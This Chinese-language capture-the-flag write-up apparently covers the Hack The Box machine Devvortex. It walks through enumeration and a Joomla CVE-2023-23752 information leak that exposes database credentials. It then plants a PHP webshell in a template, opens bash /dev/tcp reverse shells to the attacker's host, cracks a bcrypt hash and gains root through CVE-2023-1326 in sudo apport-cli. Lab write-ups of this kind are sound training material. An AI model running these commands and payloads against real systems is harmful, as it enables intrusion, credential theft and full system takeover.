# 简述

​		枚举虚拟主机名能发现另一个站点，该站点上运行这4.2版本的joomla，首先利用该版本的未经身份验证的信息泄露漏洞获取了joomla链接的数据库的凭证，利用该凭证以管理员权限登录了joomla的后台，此时我们可以修改模板中的页面代码来获取命令执行的能力。之后再次使用从joomla数据库中检索到的凭证连接目标数据库，可以破解另一个账户，该账户可以sudo执行apport-cli，利用cve-2023-1326提权。



# 01、信息收集

## 1.1 端口扫描

1. 全TCP端口扫描

   ```
   └─# nmap -sS -Pn 10.10.11.242 --min-rate 10000
   Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-27 23:41 EST
   Nmap scan report for 10.10.11.242
   Host is up (0.46s latency).
   Not shown: 996 closed tcp ports (reset)
   PORT      STATE SERVICE
   22/tcp    open  ssh
   80/tcp    open  http
   8000/tcp  open  http-alt
   12345/tcp open  netbus
   
   Nmap done: 1 IP address (1 host up) scanned in 4.70 seconds                                  
   ```

2. 全udp端口扫描

   ```
   └─# nmap -sU -p- -Pn 10.10.11.242 --min-rate 10000  
   
   ```

3. 开放端口详细信息扫描

   ```
   └─# nmap -sV -sC -Pn -p22,80,8000,12345 10.10.11.242 --min-rate 10000
   PORT      STATE SERVICE VERSION
   22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey: 
   |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
   |   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
   |_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
   80/tcp    open  http    nginx 1.18.0 (Ubuntu)
   |_http-title: Did not follow redirect to http://devvortex.htb/
   |_http-server-header: nginx/1.18.0 (Ubuntu)
   8000/tcp  open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
   |_http-server-header: SimpleHTTP/0.6 Python/3.8.10
   |_http-title: Directory listing for /
   12345/tcp open  netbus?
   | fingerprint-strings: 
   |   Help: 
   |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   |     "http://www.w3.org/TR/html4/strict.dtd">
   |     <html>
   |     <head>
   |     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
   |     <title>Error response</title>
   |     </head>
   |     <body>
   |     <h1>Error response</h1>
   |     <p>Error code: 400</p>
   |     <p>Message: Bad request syntax ('HELP').</p>
   |     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
   |     </body>
   |_    </html>
   1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
   SF-Port12345-TCP:V=7.93%I=7%D=11/27%Time=65657130%P=x86_64-pc-linux-gnu%r(
   SF:Help,1EF,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01
   SF://EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/
   SF:strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x2
   SF:0\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;ch
   SF:arset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20respons
   SF:e</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x2
   SF:0\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x
   SF:20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
   SF:0<p>Message:\x20Bad\x20request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\
   SF:x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.
   SF:BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20me
   SF:thod\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   ```

   首先将devvortex.htb添加到/etc/hosts中



## 1.2 TCP 80 HTTP

1. 指纹识别

   ```
   └─# whatweb http://devvortex.htb/
   http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
   ```

   web服务器是nginx 1.18.0，没有可以直接利用的exploit。

   浏览web站点没有找到什么有用的功能点。

   

2. 枚举http://devvortex.htb/的web子目录，没有跑出什么内容。

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.10.11.242 -t 50 --no-error --no-progress -b 302
   
   ```

3. 枚举虚拟主机名

   ```
   └─# wfuzz -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 10
   
   ********************************************************
   * Wfuzz 3.1.0 - The Web Fuzzer                         *
   ********************************************************
   
   Target: http://10.10.11.242/
   Total requests: 19966
   
   =====================================================================
   ID           Response   Lines    Word       Chars       Payload                                                                    
   =====================================================================
   
   000000019:   200        501 L    1581 W     23221 Ch    "dev"    
   ```

   将 dev.devvortex.htb添加到/etc/hosts中



4. 枚举http://dev.devvortex.htb的web子目录

   ```
   └─# gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://dev.devvortex.htb -t 50 --no-error
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:                     http://dev.devvortex.htb
   [+] Method:                  GET
   [+] Threads:                 50
   [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
   [+] Negative Status codes:   404
   [+] User Agent:              gobuster/3.6
   [+] Timeout:                 10s
   ===============================================================
   Starting gobuster in directory enumeration mode
   ===============================================================
   /libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
   /components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
   /plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
   /administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
   /modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
   /language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
   /tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
   /templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
   /includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
   /media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
   /cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
   /images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
   /api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
   /home                 (Status: 200) [Size: 23221]
   /layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
   
   ```

5. 浏览http://dev.devvortex.htb的默认页面没有找到任何有用的信息。在/robots.txt中发现了一些目录，这些目录也已经被之前枚举web子目录的步骤所探测到

   ![image-20231128135828051](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281401526.png)

   

6. /administrator上运行的是joomla，默认用户名是admin，密码在安装服务的过程中设置。尝试了简单的弱口令没有成功

   ![image-20231128140059650](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281401264.png)

   根据hacktricks中的步骤对[joomla](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)进行测试

​		

7. 在README.txt中确定Joomla的版本为4.2

   ![image-20231128142947849](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281429488.png)

   确定该版本的joomla存在一些已知的漏洞

   ![image-20231128143150572](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281651753.png)

   24969.txt的Remote Code Injection从部分poc来看需要访问joomla的后台，目前无法利用

   ```
   $shell = "{$url}administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/{$file}";
   $url   = "{$url}administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name={$file}";
   ```

   17303.txt的任意文件上传也需要登录，几个SQL注入尝试了一下poc没有结果。

   

8. 最后剩下一个未经身份验证的信息泄露。该51334.py文件后缀是py，但是查看后发现应该是ruby，修改后缀名为rb，然后尝试运行

   第一次运行报错没有httpx

   ```
   └─# ruby exploit.rb -h
   <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require': cannot load such file -- httpx (LoadError)
           from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
           from exploit.rb:33:in `<main>'
   ```

   安装缺失了库

   ```
   └─# gem install httpx      
   └─# gem install docopt
   └─# gem install paint 
   
   ```

   现在能正常运行利用脚本

   ```
   └─# ruby 51334.rb -h 
   Joomla! < 4.2.8 - Unauthenticated information disclosure
   
   Usage:
     51334.rb <url> [options]
     51334.rb -h | --help
   
   Parameters:
     <url>       Root URL (base path) including HTTP scheme, port and root folder
   
   Options:
     --debug     Display arguments
     --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
     -h, --help  Show this screen
   
   Examples:
     51334.rb http://127.0.0.1:4242
     51334.rb https://example.org/subdir
   
   Project:
     author (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
     company (https://www.acceis.fr / https://twitter.com/acceis)
     source (https://github.com/Acceis/exploit-CVE-2023-23752)
   ```

   CVE-2023-23752 是一种身份验证绕过，会导致信息泄露。大多数公开的漏洞利用绕过来泄露系统配置，其中包含 Joomla!明文形式的 MySQL 数据库凭据。

   

   根据用法运行该利用脚本，得到了一组数据库的凭证

   ```
   └─# ruby 51334.rb http://dev.devvortex.htb               
   Users
   [649] lewis (lewis) - lewis@devvortex.htb - Super Users
   [650] logan paul (logan) - logan@devvortex.htb - Registered
   
   Site info
   Site name: Development
   Editor: tinymce
   Captcha: 0
   Access: 1
   Debug status: false
   
   Database info
   DB type: mysqli
   DB host: localhost
   DB user: lewis
   DB password: P4ntherg0t1n5r3c0n##
   DB name: joomla
   DB prefix: sd4fg_
   DB encryption 0
   ```

   使用该凭证登录了/administrator。



# 02、获取初始立足点

​		作为超级用户登录 Joomla!管理网络界面后，攻击者有两种简单的路径来执行任意代码。比如修改现有模板来插入恶意代码，或者是安装恶意插件，例如[Joomla-webshell-plugin](https://github.com/p0dalirius/Joomla-webshell-plugin)。

1. 点击【System】-->【Templates】下的site_Templates

   ![image-20231128152801899](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281651110.png)



2. 选择一个模板的文件修改，这边选择的是templates/protostar/error.php，在里面追加一行`system($_GET['cmd']);`php代码来实现命令执行

   ![image-20231128153052030](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281651294.png)

3. 测试webshell，命令执行成功

   ```
   └─# curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

   

4. 利用webshell执行`bash -c 'bash -i >& /dev/tcp/10.10.16.11/4444 0>&1'`获取reverse shell，在web端访问需要进行url编码

   ```
   └─# curl -s http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.11/4444%200%3E%261%27
   
   └─# nc -nvlp 4444                                                    
   listening on [any] 4444 ...
   connect to [10.10.16.11] from (UNKNOWN) [10.10.11.242] 47952
   bash: cannot set terminal process group (857): Inappropriate ioctl for device
   bash: no job control in this shell
   www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ whoami
   whoami
   www-data
   www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ 
   ```

5. 稳固shell

   ```
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   export TERM=xterm
   Ctrl + Z 将 shell 置入后台。回到我们自己的终端，我们使用stty raw -echo; fg
   ```

   

# 03、特权升级

## 3.1 枚举

1. 目标机器是ubuntu 20.04，内核版本是5.4.0-167。没有找到可以直接利用的内核漏洞

   ```
   www-data@devvortex:/home/logan$ uname -a                                                                                                    
   Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux                               
   www-data@devvortex:/home/logan$ cat /etc/os-release                                                                                         
   NAME="Ubuntu"                                                                                                                               
   VERSION="20.04.6 LTS (Focal Fossa)"                                                                                                         
   ID=ubuntu                                                                                                                                   
   ID_LIKE=debian                                                                                                                              
   PRETTY_NAME="Ubuntu 20.04.6 LTS"                                                                                                            
   VERSION_ID="20.04"                                                                                                                          
   HOME_URL="https://www.ubuntu.com/"                                                                                                          
   SUPPORT_URL="https://help.ubuntu.com/"                                                                                                      
   BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"                                                                                         
   PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
   VERSION_CODENAME=focal
   UBUNTU_CODENAME=focal
   ```

2. 利用linpeas.sh帮助枚举

   在我印象中CVE-2021-3560是利用Polkit身份验证机制中的竞争条件，如果找不到其他利用点在来尝试他

   ![image-20231128155803356](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281651259.png)

   本地开启了mysql数据库，我们目前拥有一个数据库凭证

   ![image-20231128160718644](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281651072.png)

   目标机器上的用户

   ![image-20231128160742000](https://raw.githubusercontent.com/yxl2001/Note-drawing-bed/main/images/202311281651933.png)



## 3.2 切换到logan用户

1. 我们目前拥有一组数据库的凭证，先来连接查看一下

   ```
   www-data@devvortex:/tmp$ mysql -h localhost -u lewis -p'P4ntherg0t1n5r3c0n##'
   
   mysql> select * from sd4fg_users \G;
   *************************** 1. row ***************************
              id: 649
            name: lewis
        username: lewis
           email: lewis@devvortex.htb
        password: $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
           block: 0
       sendEmail: 1
    registerDate: 2023-09-25 16:44:24
   lastvisitDate: 2023-11-28 07:48:42
      activation: 0
          params: 
   lastResetTime: NULL
      resetCount: 0
          otpKey: 
            otep: 
    requireReset: 0
    authProvider: 
   *************************** 2. row ***************************
              id: 650
            name: logan paul
        username: logan
           email: logan@devvortex.htb
        password: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
           block: 0
       sendEmail: 0
    registerDate: 2023-09-26 19:15:42
   lastvisitDate: NULL
      activation: 
          params: {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}
   lastResetTime: NULL
      resetCount: 0
          otpKey: 
            otep: 
    requireReset: 0
    authProvider: 
   2 rows in set (0.00 sec)
   
   ERROR: 
   No query specified
   ```

   

2. 在数据库中发现了logan用户的密码哈希，利用hashcat破解该哈希

   首先识别一下哈希格式，Blowfish和bcrypt对应的哈希模式是3200

   ```
   └─# hashid hash.txt 
   --File 'hash.txt'--
   Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
   [+] Blowfish(OpenBSD) 
   [+] Woltlab Burning Board 4.x 
   [+] bcrypt 
   --End of file 'hash.txt'-- 
   ```

   

   尝试破解

   ```
   └─# hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
   
   $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
   ```

   

3. 使用该密码切换到logan，发现该用户可以sudo执行/usr/bin/apport-cli

   ```
   logan@devvortex:~$ sudo -l
   [sudo] password for logan: 
   Matching Defaults entries for logan on devvortex:
       env_reset, mail_badpass,
       secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
   
   User logan may run the following commands on devvortex:
       (ALL : ALL) /usr/bin/apport-cli
   ```



## 3.3 [CVE-2023-1326](https://github.com/advisories/GHSA-qgrc-7333-5cgx)

​	google搜索sudo apport-cli发现了[CVE-2023-1326](https://github.com/advisories/GHSA-qgrc-7333-5cgx)，apport-cli 2.26.0 及更早版本中发现了类似于 CVE-2023-26604 的权限升级攻击。如果系统被专门配置为允许非特权用户运行 sudo apport-cli，则 less 配置为寻呼机，并且可以设置终端大小：本地攻击者可以提升权限。系统管理员极不可能配置 sudo 来允许非特权用户执行此类攻击。



验证poc来自于[这里](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)

```
$ sudo apport-cli -c /var/crash/xxx.crash
[...]
Please choose (S/E/V/K/I/C): v
!id
uid=0(root) gid=0(root) groups=0(root)
```



用到了/var/crash下的一个crash文件，但是当前机器上没有。简单google了一下相关知识得知crash文件是系统崩溃时产生的核心转储文件。我们只需要创建一个系统崩溃就可以得到该文件。简单的办法是创建一个进程让它执行，然后在它执行的过程中利用kill发送SIGSEGV信号来导致目标进程崩溃。

```
logan@devvortex:~$ ls /var/crash
crash.txt
logan@devvortex:~$ sleep 60 &
[1] 17284
logan@devvortex:~$ kill -SIGSEGV 17284
logan@devvortex:~$ ls /var/crash/
crash.txt  _usr_bin_sleep.1000.crash
[1]+  Segmentation fault      (core dumped) sleep 60

```

然后执行上述的验证poc

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (29.9 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
........................................................................................................................................................................................................
!id
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
```

执行`!bash -c 'bash -i >& /dev/tcp/10.10.16.11/4444 0>&1'`获取反向shell

```
┌──(root㉿kali)-[/tmp]
└─# nc -nvlp 4444                                            
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.11.242] 32828
root@devvortex:/home/logan# id
id
uid=0(root) gid=0(root) groups=0(root)
root@devvortex:/home/logan# 

```

